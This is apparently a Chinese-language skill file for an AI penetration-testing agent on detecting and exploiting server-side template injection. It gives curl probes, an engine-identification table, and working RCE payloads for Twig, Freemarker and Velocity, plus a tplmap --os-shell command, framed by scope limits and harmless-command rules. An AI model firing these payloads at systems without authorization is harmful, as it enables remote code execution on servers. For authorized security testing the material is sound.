---
name: ssti
description: 检测和利用服务端模板注入（SSTI）漏洞，覆盖 Jinja2、Twig、Freemarker、Velocity 等主流模板引擎。
category: web
source: xalgorix
tags:
  - SSTI
  - 模板注入
  - RCE
  - 代码注入
required_tools:
  - curl
  - tplmap（可选）
---

# SSTI 服务端模板注入

## 适用场景

- 目标 Web 应用使用模板引擎渲染用户输入（如邮件模板、报告生成、预览功能）。
- 用户输入被直接嵌入模板表达式而非作为变量传入。
- 需要识别模板引擎类型并测试代码执行。

## 授权边界

- **SSTI 可导致远程代码执行（RCE），仅在 scope 允许时进行利用测试。**
- 利用前先用无害 payload 确认引擎类型，不直接执行系统命令。
- RCE 确认后，仅执行 `whoami` / `hostname` 等无害命令，不进行权限提升。

## 前置条件

- 已识别接受用户输入且可能使用模板引擎的功能点。
- 理解常见模板引擎语法差异（Jinja2 `{{}}`、Freemarker `${}`、Velocity `#{}` 等）。
- 可选：`tplmap` 或 `SSTImap` 自动化工具。

## 执行步骤

### 步骤 1：检测注入点

```bash
# 注入模板表达式探针，观察是否被解析
# 通用探针
curl -X POST "https://<target>/preview" \
  -d 'template={{7*7}}'

# 如果输出 "49"（而非 "{{7*7}}"），确认 SSTI 存在
```

```bash
# 多引擎探针组合
curl -X POST "https://<target>/preview" \
  -d 'template=${{7*7}}#{7*7}<%=7*7%>'
```

### 步骤 2：识别模板引擎

根据探针响应推断引擎类型：

| 引擎 | 语法 | 识别特征 |
| --- | --- | --- |
| Jinja2 (Python) | `{{ }}` | `{{config}}` 输出 Flask 配置 |
| Twig (PHP) | `{{ }}` | `{{_self}}` 可访问，`{{7*'7'}}` 输出 `49`（非 `7777777`） |
| Freemarker (Java) | `${ }` | `${7*7}` 输出 49 |
| Velocity (Java) | `#{}` | `#set($x=7*7)$x` |
| Smarty (PHP) | `{ }` | `{7*7}` 输出 `49` |
| ERB (Ruby) | `<%= %>` | `<%= 7*7 %>` 输出 `49` |

### 步骤 3：Jinja2 利用

```bash
# 读取配置
curl -X POST "https://<target>/preview" \
  -d 'template={{config}}'

# 执行命令（需要找到合适的 subclass）
# 先用无害 payload 验证 RCE 可能性
{{''.__class__.__mro__[1].__subclasses__()}}
```

**注意**：subclass 索引因 Python 版本和环境而异，使用 `tplmap` 可自动化此过程。

### 步骤 4：其他引擎利用

```bash
# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}

# Velocity (Java)
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
$rt.getRuntime().exec('id')
```

### 步骤 5：自动化检测

```bash
# 使用 tplmap 自动检测和利用
tplmap.py -u "https://<target>/preview" -d 'template=test' --os-shell
```

**仅在主代理确认 scope 允许 RCE 时使用 `--os-shell`。**

## 停止条件

- 仅识别引擎类型后即可记录 finding，不强制要求 RCE 验证（尤其是生产环境）。
- 如果探针被过滤但怀疑 SSTI 存在，记录 payload 和响应后停止，交由手工分析。
- 发现沙箱绕过方法时立即报告主代理。

## 输出格式

- 注入点 URL 和参数。
- 确认的模板引擎类型和版本（如可判断）。
- RCE 验证结果（如执行）。
- 沙箱强度评估（是否可读取配置、文件、执行命令）。

## 验收标准

1. 对所有疑似模板渲染的功能点进行了探针注入。
2. 至少测试了 3 种模板引擎的探针。
3. 如确认 SSTI，成功识别了引擎类型。
4. RCE 仅在生产环境之外或 scope 明确允许时验证。
